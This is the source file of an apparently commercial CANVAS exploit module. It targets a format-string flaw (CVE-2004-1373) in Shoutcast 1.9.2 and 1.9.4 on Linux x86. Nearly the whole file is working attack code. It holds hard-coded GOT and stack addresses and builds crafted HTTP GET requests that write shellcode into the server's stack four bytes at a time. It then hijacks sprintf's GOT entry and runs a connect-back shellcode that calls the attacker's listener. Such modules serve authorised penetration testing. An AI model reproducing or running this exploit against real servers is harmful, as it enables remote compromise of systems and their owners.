#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *
from shellcode import shellcodeGenerator

from tcpexploit import tcpexploit
import canvasengine
import time

NAME="shoutcast_fs"
DESCRIPTION="Format string exploit for versions 1.9.4 and 1.9.2"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Nullsoft"
DOCUMENTATION['Date public']='12/23/2004'
DOCUMENTATION['CVE Name'] = 'CVE-2004-1373'
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1373'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['References']='http://www.securityfocus.com/bid/12096'
DOCUMENTATION['Note']=''

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]

NOTES="""
one shot exploit. 
reliable against executable stack.
exploit logic:
1 - write4 our payload to the stack with the format string.
2 - write4 our shellcode address to GOT of sprintf() in sc_serv

FIX:
XXX: spawns 2 interfaces O_o
"""

CHANGELOG="""

"""



targets = {
    0:['Autodetect (N/A)',0],
    1:['Shoutcast 1.9.4 -- Linux X86',0x0806493c, 2, 117, 33],
    2:['Shoutcast 1.9.2 -- Linux X86',0x0806c270, 2, 117, 33]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.setInfo(DESCRIPTION)
        self.port=8000
        self.host=""
        self.badstring="" #\x0a\x0d\x00
        #self.badstring=""
        self.align=0
        self.prepend=0 
        self.stackpad=0 
        self.sprintf=0x01020304
        self.version=0
        self.name=NAME        
        return

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def neededListenerTypes(self):
        return [canvasengine.LINUXMOSDEF]

    def createShellcode(self):
        """
        This exploit requires shellcode that is four byte aligned
        """
        #import traceback
        #traceback.print_stack(f=sys.stderr)
        host=self.callback.ip
        port=self.callback.port
        if self.version in [1, 2]:
            #the linux x86 versions create two shellcodes
            myshellcode=shellcodeGenerator.linux_X86()
            myshellcode.addAttr("mmap_callback",{"host":host,"port":port, "do_setuid": False, "do_exit": False})
            self.shellcode=myshellcode.get()

            #add DEBUG if necessary
            #self.shellcode="\xcc"+self.shellcode #add int 3 for testing
            
            #now we four byte align it
            self.log("Shellcode is of length: %d"%len(self.shellcode))
            self.shellcode=self.shellcode+"A"*(4-len(self.shellcode)%4)
            self.log("Shellcode: %s"%hexprint(self.shellcode))
            return self.shellcode 
        return None 

    def test(self):
        """

        """
        self.getargs()

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
            s.send("GET /versiondetect HTTP/1.0\r\n\r\n")
            r = s.recv(1024)
            s.close()
        except:
            self.log("No connection could be established")
            return 0
        if "Server/Linux v1.9.4" in r:
            self.log("Target appears to be Shoutcast 1.9.4")
            self.log("Using target: Shoutcast 1.9.4 -- Linux X86")
            self.version=1
        if "Server/Linux v1.9.2" in r:
            self.log("Target appears to be Shoutcast 1.9.2")
            self.log("Using target: Shoutcast 1.9.2 -- Linux X86")
            self.version=2
        return self.version

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))  

    def tofs(self, prepend, stackpad, writeloc, writeval):
        fs  = ""
        fs += "PPPP"
        fs += struct.pack('<L', writeloc)
        fs += "PPPP"
        fs += struct.pack('<L', writeloc + 1)
        fs += "PPPP"
        fs += struct.pack('<L', writeloc + 2)
        fs += "PPPP"
        fs += struct.pack('<L', writeloc + 3)

        fs += "%x" * stackpad

        byte1 = 0x100 - prepend + (writeval & 0xff)
        byte2 = 0x200 - prepend - byte1 + ((writeval & 0xff00) >> 8)
        byte3 = 0x300 - prepend - byte1 - byte2 + ((writeval & 0xff0000) >> 16)
        byte4 = 0x400 - prepend - byte1 - byte2 - byte3 + ((writeval & 0xff000000) >> 24)

        fs += "%%.%dx%%n" % byte1 # write of lsb
        fs += "%%.%dx%%n" % byte2 
        fs += "%%.%dx%%n" % byte3
        fs += "%%.%dx%%n" % byte4 # write of msb

        #print repr(fs)
        return fs

    def gotaddy(self, addy, stackpad):
        got  = ""
        got += "PPPP"
        got += struct.pack('<L', addy)
        got += "PPPP"
        got += struct.pack('<L', addy + 1)
        got += "PPPP"
        got += struct.pack('<L', addy + 2)
        got += "PPPP"
        got += struct.pack('<L', addy + 3)
        got += "%x" * stackpad

        return got

    def write4(self, where, what):
        
        # set up my memory .. wouldnt be needed if we did dpa in main FS
        nonimp = "GET /content/%s.mp3 HTTP/1.0\r\n\r\n" % (self.align * 'D' + self.gotaddy(where, self.stackpad))
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except socket.error:
            self.log("Could not connect (SEGV?)")
            return False
        s.send(nonimp)
        s.close()

        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except socket.error:
            self.log("Could not connect!")
            return False 
        write_buf = "GET /content/%s.mp3 HTTP/1.0\r\n\r\n" % (self.align * 'D' + self.tofs(self.prepend, self.stackpad, where, what))
        s.send(write_buf)
        s.close()
        return True 

    def writesc(self, delay=0.1):
        """
        Write the shellcode using halfword %hn writes to the top of the stack
        """
        if len(self.shellcode) % 4:
            self.log("XXX: shellcode is not dword aligned")
        # write shellcode one dword at a time, payload needs to be 4 aligned
        sc_dwords = []
        sc_index = 0
        sc_left = len(self.shellcode)
        stack_top = 0xc0000000 - 8 #- 10000 + 4
        #this address needs to be out of the way of any useful data
        self.log("Using stack_top of %x"%stack_top)
        stack_bot = stack_top - len(self.shellcode) # needs to be 4 aligned !!!
        while sc_left:
            packed = self.shellcode[sc_index:sc_index+4]
            for c in packed:
                if c in self.badstring:
                    self.log("XXX: possible bad character in payload! %.2x :(" % ord(c))
            sc_dwords.append(struct.unpack('<L', self.shellcode[sc_index:sc_index+4])[0])
            sc_left -= 4
            sc_index += 4
        for dword in sc_dwords:
            time.sleep(delay)
            self.log("Writing sc dword: 0x%.8X to 0x%.8X\n" % (dword, stack_bot))
            ret=self.write4(stack_bot, dword)
            if not ret:
                self.log("Bailing...")
                return False 
            stack_bot += 4

        # return payload loc
        return	stack_top - len(self.shellcode)
        
    def run(self):
        self.getargs()
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        #uncomment this for versioning
        if self.version==0:
            if not self.test():
                return 0
            else:
                #self.shellcode="\xcc"*244 #232 default len
                self.createShellcode()
                      
        if len(self.shellcode) > 150: #should be around 132...
            self.log("Cannot create a shellcode that large:%d."%len(self.shellcode))
            self.setInfo("%s failed (shellcode too big)"%self.name)
            return 0
        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log("Shellcode is of length: %d"%len(self.shellcode))
        # new exploit logic
        self.targetname, self.sprintf, self.align, self.prepend, self.stackpad = targets[self.version]

        
        # 2. write4 the payload
        payloc = self.writesc()
        if not payloc:
            self.log("Bailing since we could not connect")
            self.setInfo("%s Failed"%self.name)
            return 0
        
        # 3. write4 the got lulz
        ret = self.write4(self.sprintf, payloc)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))            
        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

